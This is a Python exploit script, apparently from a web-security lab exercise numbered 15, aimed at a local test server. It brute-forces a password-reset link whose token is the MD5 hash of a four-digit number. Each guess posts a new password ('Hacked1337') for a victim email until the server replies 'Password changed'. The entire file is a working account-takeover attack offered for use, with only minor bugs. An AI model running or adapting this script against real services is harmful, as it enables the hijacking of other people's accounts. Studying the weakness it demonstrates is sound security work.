#!/usr/bin/python3
import hashlib, argparse, requests

##[15-PasswordReset exploit]
# Exploit the password reset hash and reset the password for the victim
#
# Use: python3 15-Exploit.py -h
##

def UserParse():
    parser = argparse.ArgumentParser()

    parser.add_argument('-u', help='Target including [EMAIL] & [HASH] to exploit.', default='http://127.0.0.1:5000/?email=EMAIL&hash=HASH', action='store_true')
    parser.add_argument('-r', help='Range of int to bruteforce', default='1000-9999')
    parser.add_argument('-e', help='Email of user', default='Mario@vsnippetmail.com')
    parser.add_argument('-p', help='New password to set', default='Hacked1337')

    option = parser.parse_args()
    return option

#Encode string to MD5 hash:
def Em5(i):
    return str(hashlib.md5(str(i).encode("utf")).hexdigest())

#Just to look cool: ;)
def LoadingBar(x, y):
    v = round(((x / y)*100))
    try:
        if v%2 == 1:
            print('['+str(v)+'%]', ((v*"=")+'>')+((100-v)*' ')+']', end='\r')
    except:
        return



#Setup Exploit conf:
bar = 0
opt = UserParse()
url = str(opt.u).replace("EMAIL", opt.e)
passwd = str(opt.p)

#Verbose:
print("Exploit options: Target:%s" % url)

#Run Exploit:
r = opt.r.split('-')
min = int(r[0]); max = int(r[1])
for i in range(min, max):
    LoadingBar(i, max)

    u = url.replace('HASH', Em5(i))
    r = requests.post(u, data={"passwd": passwd})
    
    #Hash found, success:
    if "Password changed" in r.text:
        print("\n[\033[1;32mOK\033[0m] Exploited, hash="+Em5(i))
        exit()

print("\r[\033[1;31mFAI\033[0m] Did not exploit it.")
